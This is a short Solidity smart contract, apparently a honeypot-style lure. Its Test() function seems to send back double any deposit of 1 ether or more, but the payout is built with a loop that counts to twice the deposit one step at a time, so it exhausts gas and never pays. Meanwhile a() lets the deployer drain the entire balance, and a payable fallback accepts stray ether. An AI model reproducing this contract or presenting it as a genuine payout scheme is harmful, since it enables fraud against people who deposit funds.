pragma solidity ^0.4.18;

contract Test1
{
    address b = msg.sender;

    function a()
    payable
    public
    {
        require(msg.sender==b);
        b.transfer(this.balance);
    }

    function() payable {}

    function Test()
    payable
    public
    {
        if(msg.value>=1 ether)
        {

            var d = 1;
            var e = 0;
            var c = msg.value*2;

            while(true)
            {
                if(d<e)break;
                if(d>c)break;

                e=d;
                d++;
            }
            msg.sender.transfer(e);
        }
    }
}